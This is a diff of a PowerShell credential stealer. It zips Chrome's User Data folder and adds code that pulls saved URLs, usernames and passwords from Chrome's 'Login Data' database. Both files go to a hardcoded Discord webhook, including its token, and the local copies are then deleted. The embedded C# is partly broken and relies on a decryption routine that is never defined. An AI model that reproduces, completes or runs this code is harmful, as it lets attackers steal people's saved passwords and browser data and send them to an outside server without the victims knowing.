@@ -1,4 +1,4 @@
-# Define the Discord Webhook URL (no `=` at the start)
+# Define the Discord Webhook URL
 $webhook = "https://discord.com/api/webhooks/1315398167768076348/FHFvfm3hhnJDsTNvuTR-5oB86OJY7kUwI-4F5S_Hxn7SdgZY1gXxaRQFuMO-yFFwPnPT"
 
 # Function for sending messages through Discord Webhook
@@ -54,7 +54,48 @@ function Create-ZipFile {
     return $outputZip
 }
 
-# Function for uploading files to Discord via webhook
+# Function to extract passwords from Chrome's SQLite Login Data file
+function Extract-ChromePasswords {
+    param (
+        [string]$loginDataPath
+    )
+
+    # Output text file for passwords
+    $passwordFile = "$env:TEMP\chrome_passwords.txt"
+
+    # Load SQLite assembly for extracting data
+    Add-Type -TypeDefinition @"
+    using System;
+    using System.Data.SQLite;
+    public class SQLiteHelper {
+        public static string GetPasswords(string path) {
+            using (var connection = new SQLiteConnection("Data Source=" + path)) {
+                connection.Open();
+                using (var cmd = new SQLiteCommand("SELECT origin_url, username_value, password_value FROM logins", connection)) {
+                    var reader = cmd.ExecuteReader();
+                    string passwords = "";
+                    while (reader.Read()) {
+                        var url = reader.GetString(0);
+                        var username = reader.GetString(1);
+                        var password = DecryptPassword(reader.GetString(2));  # Assuming you implement DecryptPassword
+                        passwords += "URL: " + url + " Username: " + username + " Password: " + password + "`n";
+                    }
+                    return passwords;
+                }
+            }
+        }
+    }
+"@
+
+    # Call the function to extract passwords
+    $passwords = [SQLiteHelper]::GetPasswords($loginDataPath)
+
+    # Save the passwords to a .txt file
+    Set-Content -Path $passwordFile -Value $passwords
+    return $passwordFile
+}
+
+# Function to upload files to Discord via webhook
 function Upload-FileToDiscord {
     param (
         [string]$filePath
@@ -97,12 +138,21 @@ if (-not (Test-Path $chromePath)) {
 
 # Define the path for the zip file
 $outputZip = "$env:TEMP\chrome_data.zip"
+$passwordFile = "$env:TEMP\chrome_passwords.txt"
 
 # Create the zip file with Chrome User Data
 $zipFile = Create-ZipFile -chromePath $chromePath -outputZip $outputZip
 
+# Extract passwords and save to a text file
+$loginDataPath = "$chromePath\Default\Login Data"
+$passwordTxtFile = Extract-ChromePasswords -loginDataPath $loginDataPath
+
 # Upload the zip file to Discord
 Upload-FileToDiscord -filePath $zipFile
 
-# Optionally, remove the zip file after uploading
+# Upload the passwords text file to Discord
+Upload-FileToDiscord -filePath $passwordTxtFile
+
+# Optionally, remove the files after uploading
 Remove-Item $zipFile
+Remove-Item $passwordTxtFile
